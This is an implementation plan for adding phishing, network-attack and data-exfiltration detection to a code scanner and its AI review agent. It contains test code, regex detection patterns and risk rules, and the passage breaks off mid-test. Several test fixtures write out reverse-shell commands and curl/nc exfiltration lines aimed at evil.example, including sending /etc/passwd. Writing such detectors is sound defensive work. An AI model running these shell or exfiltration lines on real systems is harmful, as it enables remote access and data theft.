# Threat Detection Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add deterministic detection for phishing, network-attack, and data-exfiltration threats, and let the AI review agent add verified new findings for those families (AI-sourced, never auto-Block) with context-window budget management and an overall wait-time deadline.

**Architecture:** A new `threatPatterns.ts` module in `scanner-core` collects per-family `ThreatSignal`s during inventory build; 6 new rules turn them into findings, with cross-file exfiltration correlation (sensitive source + concrete sink → `exfiltration-candidate`). In `ai-review`, `AgentFinalResult`/`AiReviewResult` gain `newFindings`, prompts are relaxed to allow the three families only, `normalizeAiFindings` caps them at `Medium`/`Low`/`source:"ai"`, `mergeAiFindingsIntoReport` recomputes risk, and the agent loop gains context-window budgeting (history pruning) plus a shared deadline abort.

**Tech Stack:** TypeScript, Vitest, Electron IPC, Node `AbortController`.

**Spec:** `docs/superpowers/specs/2026-08-05-threat-detection-hardening-design.md`

---

## File Map

Track 1 (scanner-core):
- `packages/scanner-core/src/threatPatterns.ts` — new: `ThreatFamily`, `ThreatSignal`, pattern tables, collector
- `packages/scanner-core/src/inventory.ts` — add `threatSignals` field + wire collector
- `packages/scanner-core/src/types.ts` — add `phishing`/`network-attack` categories, `ThreatSignal`, `ProjectInventory.threatSignals`
- `packages/scanner-core/src/defaultRules.ts` — 6 new rules + exfiltration correlation helper
- `packages/scanner-core/src/risk.ts` — add blocking categories + `source === "ai"` exclusion
- `packages/scanner-core/src/i18n.ts` — category labels + rule strings (3 languages)
- `packages/scanner-core/src/index.ts` — exports

Track 2 (ai-review + electron):
- `packages/ai-review/src/agent.ts` — `newFindings` parse, history pruning
- `packages/ai-review/src/review.ts` — prompt relax, deadline/progress, `normalizeAiFindings`, `mergeAiFindingsIntoReport`
- `packages/ai-review/src/types.ts` — `contextWindow`, `maxTotalMs`, `onBatchProgress`, `AiNewFinding`, `newFindings`, `truncated`
- `packages/ai-review/src/index.ts` — exports
- `apps/electron/src/main.ts` — `ai-review:run` returns `mergedReport` and regenerated `mergedOutputs`
- `apps/electron/src/renderer/index.html` — batch progress copy + merged report render

Tests:
- `packages/scanner-core/tests/threatPatterns.test.ts` — new
- `packages/scanner-core/tests/rules.test.ts`, `packages/scanner-core/tests/inventory.test.ts` — extend
- `packages/ai-review/tests/agent.test.ts`, `tests/review.test.ts` — extend
- `apps/electron/tests/ipc.test.ts` — extend

---

## Task 1: Add `threatPatterns.ts` module

**Files:**
- Create: `packages/scanner-core/src/threatPatterns.ts`
- Modify: `packages/scanner-core/src/types.ts` (add `ThreatFamily`, `ThreatSignal` types)
- Test: `packages/scanner-core/tests/threatPatterns.test.ts` (new)

- [ ] **Step 1: Write the failing test**

Create `packages/scanner-core/tests/threatPatterns.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { collectThreatSignals } from "../src/threatPatterns.js";

describe("collectThreatSignals", () => {
  it("detects reverse and bind shells", () => {
    const signals = collectThreatSignals(
      "script.sh",
      'bash -i >& /dev/tcp/evil.example/4444 0>&1\nnc -e /bin/sh evil.example 4444\n'
    );

    expect(signals.some((s) => s.family === "network-attack" && s.pattern === "reverse-shell-dev-tcp")).toBe(true);
    expect(signals.some((s) => s.family === "network-attack" && s.pattern === "reverse-shell-nc")).toBe(true);
  });

  it("detects SSRF and port scanning", () => {
    const signals = collectThreatSignals(
      "app.py",
      "import requests\nrequests.get(target_url)\nsocket.connect_ex(('1.2.3.4', 80))\n"
    );

    expect(signals.some((s) => s.pattern === "ssrf-sink")).toBe(true);
    expect(signals.some((s) => s.pattern === "port-scan")).toBe(true);
  });

  it("detects credential harvesting and keyloggers", () => {
    const signals = collectThreatSignals(
      "app.js",
      'document.getElementById("password").value\nwindow.addEventListener("keydown", e => send(e.key))\n'
    );

    expect(signals.some((s) => s.family === "phishing" && s.pattern === "credential-harvest")).toBe(true);
    expect(signals.some((s) => s.family === "phishing" && s.pattern === "keylogger")).toBe(true);
  });

  it("detects webhook, encoded, non-http, and file-upload exfiltration sinks", () => {
    const signals = collectThreatSignals(
      "exfil.sh",
      'curl -d @/etc/passwd https://evil.example/upload\ncurl https://discord.com/api/webhooks/123/abc\necho secret | base64 -d | nc evil.example 4444\n'
    );

    expect(signals.some((s) => s.pattern === "webhook-sink")).toBe(true);
    expect(signals.some((s) => s.pattern === "encoded-sink")).toBe(true);
    expect(signals.some((s) => s.pattern === "non-http-sink")).toBe(true);
    expect(signals.some((s) => s.pattern === "file-upload-sink")).toBe(true);
  });

  it("records line numbers and deduplicates identical signals", () => {
    const signals = collectThreatSignals(
      "a.sh",
      "nc -e /bin/sh evil.example 4444\nnc -e /bin/sh evil.example 4444\n"
    );

    expect(signals.filter((s) => s.pattern === "reverse-shell-nc")).toHaveLength(1);
    expect(signals.find((s) => s.pattern === "reverse-shell-nc")?.line).toBe(1);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/scanner-core/tests/threatPatterns.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: FAIL with "Cannot find module '../src/threatPatterns.js'"

- [ ] **Step 3: Add `ThreatFamily` / `ThreatSignal` types to `types.ts`**

In `packages/scanner-core/src/types.ts`, after the `LanguageId` type (line 52-59), add:

```ts
export type ThreatFamily = "phishing" | "network-attack" | "data-exfiltration";

export interface ThreatSignal {
  family: ThreatFamily;
  pattern: string;
  filePath: string;
  line: number;
  snippet: string;
  evidenceTags: string[];
}
```

- [ ] **Step 4: Implement `threatPatterns.ts`**

Create `packages/scanner-core/src/threatPatterns.ts`:

```ts
import type { ThreatFamily, ThreatSignal } from "./types.js";

interface ThreatPattern {
  id: string;
  family: ThreatFamily;
  regex: RegExp;
  tags: string[];
}

const THREAT_PATTERNS: ThreatPattern[] = [
  {
    id: "reverse-shell-dev-tcp",
    family: "network-attack",
    regex: /\/dev\/tcp\/|bash\s+-i\s+>&/,
    tags: ["network-attack", "reverse-shell"]
  },
  {
    id: "reverse-shell-nc",
    family: "network-attack",
    regex: /\bnc(?:at)?\s+[^\n]*\s+-e\s+\/(?:bin|usr)\/(?:ba)?sh/,
    tags: ["network-attack", "reverse-shell"]
  },
  {
    id: "bind-shell",
    family: "network-attack",
    regex: /\bnc(?:at)?\s+-l[^\n]*|socat\s+TCP-LISTEN/,
    tags: ["network-attack", "bind-shell"]
  },
  {
    id: "ssrf-sink",
    family: "network-attack",
    regex: /(?:requests\.(?:get|post|request)\(\s*[^"']|urllib(?:\.request)?\.urlopen\(\s*[^"']|fetch\(\s*[a-zA-Z_$]|axios\.(?:get|post|request)\(\s*[^"'])/,
    tags: ["network-attack", "ssrf"]
  },
  {
    id: "port-scan",
    family: "network-attack",
    regex: /\bconnect_ex\s*\(|nmap|masscan/,
    tags: ["network-attack", "port-scan"]
  },
  {
    id: "credential-harvest",
    family: "phishing",
    regex: /getElementById(?:By(?:Tag|Class)Name)?\(\s*['"]password|localStorage|chrome\.(?:storage|cookies)/,
    tags: ["phishing", "credential-harvesting"]
  },
  {
    id: "keylogger",
    family: "phishing",
    regex: /\baddEventListener\(\s*['"]keydown|pynput|hook_all/,
    tags: ["phishing", "keylogger"]
  },
  {
    id: "bulk-email",
    family: "phishing",
    regex: /\bsmtplib\.SMTP\s*\(|nodemailer\s+createTransport|sendmail/,
    tags: ["phishing", "bulk-email"]
  },
  {
    id: "webhook-sink",
    family: "data-exfiltration",
    regex: /discord\.com\/api\/webhooks|api\.telegram\.org|hooks\.slack\.com|webhook\.site|requestbin/,
    tags: ["data-exfiltration", "webhook"]
  },
  {
    id: "encoded-sink",
    family: "data-exfiltration",
    regex: /\bbase64\s+(?:-d|--decode)[^\n]*\|\s*(?:curl|nc|wget)|\b(?:btoa|atob)\s*\(|Buffer\.from\([^,]+,\s*['"]base64['"]\)/,
    tags: ["data-exfiltration", "encoded"]
  },
  {
    id: "non-http-sink",
    family: "data-exfiltration",
    regex: /\b(?:nc|ncat|socat|scp|rsync)\b[^\n]*(?:[0-9]{1,3}\.){3}[0-9]{1,3}|:\d{4,5}\b|\b(?:ftp|sftp)\s+[^\s]+/,
    tags: ["data-exfiltration", "non-http"]
  },
  {
    id: "file-upload-sink",
    family: "data-exfiltration",
    regex: /\bcurl\s+[^\n]*(?:-d\s+@|-F\s+)/,
    tags: ["data-exfiltration", "file-upload"]
  }
];

export function collectThreatSignals(content: string, filePath: string): ThreatSignal[] {
  const signals: ThreatSignal[] = [];
  const seen = new Set<string>();

  content.split(/\r?\n/).forEach((lineText, index) => {
    for (const pattern of THREAT_PATTERNS) {
      if (pattern.regex.test(lineText)) {
        const key = `${filePath}\0${index + 1}\0${pattern.id}`;
        if (seen.has(key)) {
          continue;
        }
        seen.add(key);
        signals.push({
          family: pattern.family,
          pattern: pattern.id,
          filePath,
          line: index + 1,
          snippet: lineText.trim(),
          evidenceTags: pattern.tags
        });
      }
    }
  });

  return signals;
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `npx vitest run packages/scanner-core/tests/threatPatterns.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: PASS (5 tests)

- [ ] **Step 6: Export types from `index.ts`**

In `packages/scanner-core/src/index.ts`, extend the `types.js` export block:

```ts
export type {
  ThreatFamily,
  ThreatSignal,
  ...
} from "./types.js";
```

(Add `ThreatFamily` and `ThreatSignal` to the existing `export type { ... } from "./types.js"` list.)

- [ ] **Step 7: Commit**

```bash
git add packages/scanner-core/src/threatPatterns.ts packages/scanner-core/src/types.ts packages/scanner-core/src/index.ts packages/scanner-core/tests/threatPatterns.test.ts
git commit -m "feat: threat-family pattern module (phishing/network/exfil)"
```

---

## Task 2: Wire `threatSignals` into inventory build

**Files:**
- Modify: `packages/scanner-core/src/inventory.ts`
- Test: `packages/scanner-core/tests/inventory.test.ts`

- [ ] **Step 1: Write the failing test**

In `packages/scanner-core/tests/inventory.test.ts`, import `collectThreatSignals`-related expectations. Find the existing first `describe`/`it` block and add a new `it`:

```ts
it("collects threat signals from scannable files", async () => {
  const root = await createProject({
    "setup.sh": "nc -e /bin/sh evil.example 4444\n",
    "src/app.js": 'fetch(host); window.addEventListener("keydown", () => {});\n',
    "data.py": "import smtplib\nsmtplib.SMTP('smtp.evil.example')\n"
  });
  const inventory = await buildInventory(root);

  expect(inventory.threatSignals.some((s) => s.pattern === "reverse-shell-nc")).toBe(true);
  expect(inventory.threatSignals.some((s) => s.pattern === "ssrf-sink")).toBe(true);
  expect(inventory.threatSignals.some((s) => s.pattern === "keylogger")).toBe(true);
  expect(inventory.threatSignals.some((s) => s.pattern === "bulk-email")).toBe(true);
});
```

Check whether `inventory.test.ts` already has a `createProject` helper — if it does, reuse it; if not, copy the one from `tests/rules.test.ts`.

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/scanner-core/tests/inventory.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: FAIL with "inventory.threatSignals is undefined"

- [ ] **Step 3: Add field to `ProjectInventory`**

In `packages/scanner-core/src/inventory.ts`, add `threatSignals: ThreatSignal[]` to `ProjectInventory` (after `dangerousCalls`, line 35), and import the type:

```ts
import type { ThreatSignal } from "./types.js";
```

- [ ] **Step 4: Wire collector in `buildInventory`**

Initialize the field in the inventory literal (after `dangerousCalls: []`):

```ts
threatSignals: []
```

And call the collector inside the per-file loop, after `collectDangerousCalls(content, filePath, inventory);` (line 218):

```ts
inventory.threatSignals.push(...collectThreatSignals(content, filePath));
```

Add the import at the top of the file:

```ts
import { collectThreatSignals } from "./threatPatterns.js";
```

- [ ] **Step 5: Run test to verify it passes**

Run: `npx vitest run packages/scanner-core/tests/inventory.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add packages/scanner-core/src/inventory.ts packages/scanner-core/tests/inventory.test.ts
git commit -m "feat: collect threat signals during inventory build"
```

---

## Task 3: Add 6 threat rules + cross-file exfiltration correlation

**Files:**
- Modify: `packages/scanner-core/src/defaultRules.ts`
- Test: `packages/scanner-core/tests/rules.test.ts`

- [ ] **Step 1: Write the failing test**

Append a new `describe` block to `packages/scanner-core/tests/rules.test.ts`:

```ts
describe("threat-family rules", () => {
  it("flags reverse shells as Critical network-attack", async () => {
    const root = await createProject({
      "pwn.sh": "bash -i >& /dev/tcp/evil.example/4444 0>&1\n"
    });
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);

    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "network-attack",
        riskLevel: "Critical",
        filePath: "pwn.sh",
        confidence: "High",
        evidenceTags: expect.arrayContaining(["reverse-shell"])
      })
    );
  });

  it("flags credential harvesting as Critical phishing", async () => {
    const root = await createProject({
      "phish.js": 'document.getElementById("password").value; fetch("https://evil.example/steal", {method:"POST", body: p});\n'
    });
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);

    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "phishing",
        riskLevel: "Critical",
        filePath: "phish.js"
      })
    );
  });

  it("flags an SSRF sink as High network-attack", async () => {
    const root = await createProject({
      "app.py": "import requests\nrequests.get(target_url)\n"
    });
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);

    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "network-attack",
        riskLevel: "High",
        filePath: "app.py",
        evidenceTags: expect.arrayContaining(["ssrf"])
      })
    );
  });

  it("cross-file exfiltration: sensitive source in one file + webhook sink in another", async () => {
    const root = await createProject({
      "src/collector.ts": "const token = process.env.API_TOKEN; readFileSync('/etc/passwd');\n",
      "scripts/upload.ts": 'fetch("https://discord.com/api/webhooks/123/abc", {method:"POST", body: data});\n'
    });
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);

    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "data-exfiltration",
        riskLevel: "High",
        filePath: "scripts/upload.ts",
        evidenceTags: expect.arrayContaining(["webhook", "exfiltration-candidate"])
      })
    );
  });

  it("does not flag a lone webhook with no sensitive source as exfiltration candidate", async () => {
    const root = await createProject({
      "scripts/upload.ts": 'fetch("https://discord.com/api/webhooks/123/abc", {method:"POST", body: "hello"});\n'
    });
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);
    const exfil = findings.filter((f) => f.category === "data-exfiltration");

    expect(exfil).toHaveLength(1);
    expect(exfil[0].evidenceTags).not.toContain("exfiltration-candidate");
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/scanner-core/tests/rules.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: FAIL (threat rules not implemented; new categories unknown)

- [ ] **Step 3: Implement the 6 rules + correlation helper in `defaultRules.ts`**

Add to `defaultRules.ts` (after the `actions-external-action` rule, line 302). First a helper that maps `ThreatSignal` items to rules. Add after `dcTags` (line 16):

```ts
const threatSignalTags: TagsFn = (item) => {
  const tags = item.evidenceTags;
  return Array.isArray(tags) ? (tags as string[]) : [];
};
```

Append rules to `builtinRules` (before the closing `];` at line 303):

```ts
{
  id: "reverse-shell",
  description: "Detects reverse or bind shells that connect back to an attacker-controlled host",
  category: "network-attack",
  defaultRiskLevel: "Critical",
  inventoryField: "threatSignals",
  match: (item) => ["reverse-shell-dev-tcp", "reverse-shell-nc", "bind-shell"].includes(String(item.pattern)),
  riskLevel: () => "Critical" as RiskLevel,
  snippet: (item) => String(item.snippet),
  explanation: () =>
    "The code establishes a reverse or bind shell, granting an attacker interactive remote access to the machine.",
  recommendedFix: () => "Remove shell-backdoor code and terminate any active sessions; scan for how this code was introduced.",
  tags: threatSignalTags
},
{
  id: "ssrf-sink",
  description: "Detects server-side request forgery sinks where a variable reaches an HTTP client",
  category: "network-attack",
  defaultRiskLevel: "High",
  inventoryField: "threatSignals",
  match: (item) => String(item.pattern) === "ssrf-sink",
  riskLevel: () => "High" as RiskLevel,
  snippet: (item) => String(item.snippet),
  explanation: () =>
    "An HTTP client is called with a non-literal URL. If user-controlled, it becomes SSRF enabling access to internal resources.",
  recommendedFix: () => "Validate and allowlist destination URLs; never pass raw user input to HTTP clients.",
  tags: threatSignalTags
},
{
  id: "port-scan",
  description: "Detects port scanning primitives",
  category: "network-attack",
  defaultRiskLevel: "Medium",
  inventoryField: "threatSignals",
  match: (item) => String(item.pattern) === "port-scan",
  riskLevel: () => "Medium" as RiskLevel,
  snippet: (item) => String(item.snippet),
  explanation: () =>
    "The code performs network reconnaissance (connect_ex, nmap, or masscan). This may indicate scanning or lateral movement.",
  recommendedFix: () => "Remove scanning utilities unless this is an authorized security tool with documented scope.",
  tags: threatSignalTags
},
{
  id: "credential-harvest",
  description: "Detects client-side credential harvesting (password reads, storage/cookie access)",
  category: "phishing",
  defaultRiskLevel: "Critical",
  inventoryField: "threatSignals",
  match: (item) => String(item.pattern) === "credential-harvest",
  riskLevel: () => "Critical" as RiskLevel,
  snippet: (item) => String(item.snippet),
  explanation: () =>
    "The code reads password fields, localStorage, or cookies. When combined with outbound transmission this is credential harvesting.",
  recommendedFix: () => "Remove credential collection; if legitimate, keep credentials inside server-side sessions and never transmit them to third parties.",
  tags: threatSignalTags
},
{
  id: "keylogger",
  description: "Detects keyboard logging primitives",
  category: "phishing",
  defaultRiskLevel: "High",
  inventoryField: "threatSignals",
  match: (item) => String(item.pattern) === "keylogger",
  riskLevel: () => "High" as RiskLevel,
  snippet: (item) => String(item.snippet),
  explanation: () =>
    "The code registers keyboard listeners or hook APIs that capture keystrokes. This is characteristic of phishing/keylogging malware.",
  recommendedFix: () => "Remove keystroke capture unless it is an explicitly documented accessibility feature.",
  tags: threatSignalTags
},
{
  id: "exfiltration-sink",
  description: "Detects outbound data-exfiltration sinks (webhooks, encoded channels, non-HTTP, file upload)",
  category: "data-exfiltration",
  defaultRiskLevel: "High",
  inventoryField: "threatSignals",
  match: (item) => ["webhook-sink", "encoded-sink", "non-http-sink", "file-upload-sink"].includes(String(item.pattern)),
  riskLevel: () => "High" as RiskLevel,
  snippet: (item) => String(item.snippet),
  explanation: () =>
    "The code sends data through an exfiltration channel (webhook, encoded stream, non-HTTP connection, or file upload).",
  recommendedFix: () => "Remove unauthorized outbound channels and route data only through approved, audited endpoints.",
  tags: threatSignalTags
}
```

Now update `applyBuiltinRules` (line 382-399). Change the body to add the correlation pass after the loop, before the id-mapping return. Replace the final two lines:

```ts
  findings.push(...networkRule(inventory));
  findings.push(...exfiltrationCorrelation(inventory));

  return findings.map((item, index) => ({ ...item, id: `finding-${index + 1}` }));
```

And add the correlation helper after `networkRule` (after line 353):

```ts
export function exfiltrationCorrelation(
  inventory: ProjectInventory,
  existing: Finding[]
): Finding[] {
  const sinkPatterns = new Set(["webhook-sink", "encoded-sink", "non-http-sink", "file-upload-sink"]);
  const hasSensitiveSource =
    inventory.environmentVariables.length > 0 ||
    inventory.filesystemReads.length > 0 ||
    inventory.commandExecutions.length > 0;
  const newFindings: Finding[] = [];

  if (!hasSensitiveSource) {
    return newFindings;
  }

  for (const signal of inventory.threatSignals) {
    if (!sinkPatterns.has(signal.pattern)) {
      continue;
    }

    const alreadyExfil = existing.find(
      (f) =>
        f.category === "data-exfiltration" &&
        f.filePath === signal.filePath &&
        f.lineStart === signal.line
    );
    if (alreadyExfil) {
      alreadyExfil.evidenceTags = Array.from(
        new Set([...alreadyExfil.evidenceTags, "exfiltration-candidate"])
      );
      continue;
    }

    newFindings.push({
      id: "",
      category: "data-exfiltration",
      riskLevel: "High",
      filePath: signal.filePath,
      lineStart: signal.line,
      lineEnd: signal.line,
      codeSnippet: signal.snippet,
      explanation:
        "The project contains sensitive sources (env vars, filesystem reads, or command execution) and an outbound exfiltration sink. This is an exfiltration candidate — review whether sensitive data can flow to this destination.",
      recommendedFix:
        "Remove unauthorized outbound channels or isolate sensitive data from network-accessible code.",
      evidenceTags: [...signal.evidenceTags, "exfiltration-candidate"],
      confidence: "High"
    });
  }

  return newFindings;
}
```

Note: `exfiltrationCorrelation` receives the accumulated `findings` as `existing` and augments the `exfiltration-sink` rule findings in place (adding `exfiltration-candidate`), returning only genuinely-orphaned new findings. Because builtin rules run before the correlation pass, that lookup works.

> **Plan correction (shipped in `c80f86e`):** the original snippet passed only `inventory`, so its `alreadyExfil` lookup searched the helper's own empty array and would have duplicated every sink finding. The shipped signature is `(inventory, existing)`; `applyBuiltinRules` calls `findings.push(...exfiltrationCorrelation(inventory, findings))`. The lookup also guards `f.category === "data-exfiltration"` so an unrelated finding on the same file/line is never tagged. Behavior note (approved): findings are intentionally emitted **per signal** — a single line matching multiple patterns yields multiple findings (e.g. `nc -l -p 4444 -e /bin/sh` → `reverse-shell` + `bind-shell`).

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run packages/scanner-core/tests/rules.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: PASS (including the 5 new threat-family tests)

- [ ] **Step 5: Export the new helper from `index.ts`**

In `packages/scanner-core/src/index.ts`, add:

```ts
export { applyBuiltinRules, builtinRules, exfiltrationCorrelation, generateFinding } from "./defaultRules.js";
```

- [ ] **Step 6: Commit**

```bash
git add packages/scanner-core/src/defaultRules.ts packages/scanner-core/src/index.ts packages/scanner-core/tests/rules.test.ts
git commit -m "feat: threat-family rules with cross-file exfiltration correlation"
```

---

## Task 4: Risk blocking categories + AI-source exclusion

**Files:**
- Modify: `packages/scanner-core/src/risk.ts`
- Test: `packages/scanner-core/tests/reporters.test.ts`

- [ ] **Step 1: Write the failing test**

Append to `packages/scanner-core/tests/reporters.test.ts` (import `assessRisk` is already present at line 13):

```ts
it("blocks on high-confidence phishing and network-attack findings", () => {
  const risk = assessRisk([
    {
      id: "finding-1",
      riskLevel: "High",
      category: "phishing",
      filePath: "phish.js",
      lineStart: 1,
      lineEnd: 1,
      codeSnippet: "credential harvest",
      explanation: "credential harvesting",
      recommendedFix: "remove",
      evidenceTags: ["phishing", "credential-harvesting"],
      confidence: "High"
    },
    {
      id: "finding-2",
      riskLevel: "High",
      category: "network-attack",
      filePath: "pwn.sh",
      lineStart: 1,
      lineEnd: 1,
      codeSnippet: "reverse shell",
      explanation: "reverse shell",
      recommendedFix: "remove",
      evidenceTags: ["reverse-shell"],
      confidence: "High"
    }
  ]);

  expect(risk.decision).toBe("Block");
  expect(risk.blockingFindingIds).toContain("finding-1");
  expect(risk.blockingFindingIds).toContain("finding-2");
});

it("does not let AI-sourced findings trigger Block", () => {
  const risk = assessRisk([
    {
      id: "finding-1",
      riskLevel: "High",
      category: "phishing",
      filePath: "phish.js",
      lineStart: 1,
      lineEnd: 1,
      codeSnippet: "credential harvest",
      explanation: "ai-reported credential harvesting",
      recommendedFix: "remove",
      evidenceTags: ["phishing", "credential-harvesting"],
      source: "ai",
      confidence: "High"
    }
  ]);

  expect(risk.decision).toBe("Needs Review");
  expect(risk.blockingFindingIds).not.toContain("finding-1");
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/scanner-core/tests/reporters.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: FAIL — first test decision not Block (categories not blocking); second test blocks the AI-sourced finding

- [ ] **Step 3: Implement risk changes**

In `packages/scanner-core/src/risk.ts`, add the two categories to `blockingCategories` (line 6-14):

```ts
const blockingCategories: FindingCategory[] = [
  "data-exfiltration",
  "credential-leakage",
  "command-injection",
  "remote-code-execution",
  "persistence",
  "postinstall-script",
  "github-actions",
  "phishing",
  "network-attack"
];
```

Update the `blocking` filter (lines 32-38) to exclude AI-sourced findings:

```ts
const blocking = findings.filter(
  (finding) =>
    finding.source !== "ai" &&
    (finding.riskLevel === "Critical" ||
      (finding.riskLevel === "High" &&
        finding.confidence === "High" &&
        (blockingCategories.includes(finding.category) || finding.evidenceTags.includes("exfiltration-candidate"))))
);
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run packages/scanner-core/tests/reporters.test.ts` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add packages/scanner-core/src/risk.ts packages/scanner-core/tests/reporters.test.ts
git commit -m "feat: block on phishing/network-attack, exclude AI-sourced findings"
```

---

## Task 5: i18n labels + rule strings

**Files:**
- Modify: `packages/scanner-core/src/i18n.ts`
- Test: `packages/scanner-core/tests/reporters.test.ts` (already covered by Task 4 render assertions — skip new tests here)

- [ ] **Step 1: Add category labels for `phishing` and `network-attack`**

In `packages/scanner-core/src/i18n.ts`, `categoryLabels` is `Record<Language, Record<FindingCategory, string>>`. Add to each language block. After the `network` line in the en block (line 30), add:

```ts
    phishing: "Phishing",
    "network-attack": "Network Attack",
```

After the `network` line in the zh-TW block (line 47), add:

```ts
    phishing: "釣魚",
    "network-attack": "網路攻擊",
```

After the `network` line in the zh-CN block (line 64), add:

```ts
    phishing: "钓鱼",
    "network-attack": "网络攻击",
```

- [ ] **Step 2: Add finding explanation/fix translations**

The 6 new rules currently return hardcoded English strings from `defaultRules.ts` (Task 3). Follow the existing `exf` translation map pattern (see `i18n.ts` around lines 250-278 for how the networkRule English text is keyed to the same string in all languages). Add these key/value pairs to the `exf` map for each language so the English strings are preserved verbatim (matching how existing strings self-map):

For the en, zh-TW, and zh-CN `exf` blocks, add self-mapped entries for each new rule's `explanation` and `recommendedFix` English strings, then translated zh-TW/zh-CN values for the key ones:

- en block: each string maps to itself.
- zh-TW block: provide Traditional Chinese translations.
- zh-CN block: provide Simplified Chinese translations.

Example of the key set (each needs an entry in every language block):

```
"The code establishes a reverse or bind shell, granting an attacker interactive remote access to the machine."
"Remove shell-backdoor code and terminate any active sessions; scan for how this code was introduced."
"An HTTP client is called with a non-literal URL. If user-controlled, it becomes SSRF enabling access to internal resources."
"Validate and allowlist destination URLs; never pass raw user input to HTTP clients."
"The code performs network reconnaissance (connect_ex, nmap, or masscan). This may indicate scanning or lateral movement."
"Remove scanning utilities unless this is an authorized security tool with documented scope."
"The code reads password fields, localStorage, or cookies. When combined with outbound transmission this is credential harvesting."
"Remove credential collection; if legitimate, keep credentials inside server-side sessions and never transmit them to third parties."
"The code registers keyboard listeners or hook APIs that capture keystrokes. This is characteristic of phishing/keylogging malware."
"Remove keystroke capture unless it is an explicitly documented accessibility feature."
"The code sends data through an exfiltration channel (webhook, encoded stream, non-HTTP connection, or file upload)."
"Remove unauthorized outbound channels and route data only through approved, audited endpoints."
"The project contains sensitive sources (env vars, filesystem reads, or command execution) and an outbound exfiltration sink. This is an exfiltration candidate — review whether sensitive data can flow to this destination."
"Remove unauthorized outbound channels or isolate sensitive data from network-accessible code."
```

For zh-TW (sample translations — fill the rest consistently):

```
"The code establishes a reverse or bind shell, granting an attacker interactive remote access to the machine.": "程式碼建立了反向或綁定 shell，讓攻擊者可互動式遠端存取本機。",
"Remove shell-backdoor code and terminate any active sessions; scan for how this code was introduced.": "移除 shell 後門程式碼並終止所有作用中的連線；調查此程式碼如何被引入。",
"An HTTP client is called with a non-literal URL. If user-controlled, it becomes SSRF enabling access to internal resources.": "HTTP 用戶端以非字面值 URL 呼叫。若可被使用者控制，將成為可存取內部資源的 SSRF。",
"Validate and allowlist destination URLs; never pass raw user input to HTTP clients.": "驗證並白名單化目標 URL；切勿將未處理的使用者輸入傳給 HTTP 用戶端。",
"The code reads password fields, localStorage, or cookies. When combined with outbound transmission this is credential harvesting.": "程式碼讀取密碼欄位、localStorage 或 cookie。若加上對外傳輸，即為憑證竊取。",
"The code registers keyboard listeners or hook APIs that capture keystrokes. This is characteristic of phishing/keylogging malware.": "程式碼註冊鍵盤監聽器或鉤子 API 以擷取按鍵輸入，這是釣魚/鍵盤側錄惡意軟體的特徵。",
"The code sends data through an exfiltration channel (webhook, encoded stream, non-HTTP connection, or file upload).": "程式碼透過外洩通道（webhook、編碼串流、非 HTTP 連線或檔案上傳）傳送資料。",
"Remove unauthorized outbound channels and route data only through approved, audited endpoints.": "移除未授權的對外通道，僅透過經過核准與稽核的端點傳送資料。",
```

- [ ] **Step 3: Verify build + tests pass**

Run: `npx vitest run packages/scanner-core/tests` (from repo root; the `npm --workspace` form is broken because the root vitest.config.ts include patterns are repo-root-relative)
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add packages/scanner-core/src/i18n.ts
git commit -m "feat: i18n labels for phishing/network-attack and threat rule strings"
```

---

## Task 6: AI agent — parse `newFindings` + history pruning

**Files:**
- Modify: `packages/ai-review/src/agent.ts`
- Modify: `packages/ai-review/src/types.ts`
- Test: `packages/ai-review/tests/agent.test.ts`

- [ ] **Step 1: Write the failing test**

Append to `packages/ai-review/tests/agent.test.ts`:

```ts
it("parses newFindings from a final response", () => {
  const parsed = parseAgentResponse(
    JSON.stringify({
      type: "final",
      summary: "found an exfil sink",
      notes: [],
      newFindings: [
        {
          category: "data-exfiltration",
          filePath: "scripts/upload.ts",
          lineStart: 3,
          lineEnd: 3,
          codeSnippet: "fetch(discordWebhook)",
          explanation: "verified webhook sink sending local files",
          recommendedFix: "remove the webhook call"
        }
      ]
    })
  );

  expect(parsed?.type).toBe("final");
  if (parsed?.type === "final") {
    expect(parsed.result.newFindings).toHaveLength(1);
    expect(parsed.result.newFindings[0].category).toBe("data-exfiltration");
    expect(parsed.result.newFindings[0].filePath).toBe("scripts/upload.ts");
  }
});

it("prunes oldest tool results when the prompt exceeds the budget", async () => {
  const fetchImpl = jsonCompletion(JSON.stringify({ type: "final", summary: "done", notes: [] }));
  const config: AiProviderConfig = {
    type: "cloud",
    baseUrl: "https://api.example.test/v1",
    model: "gpt-test",
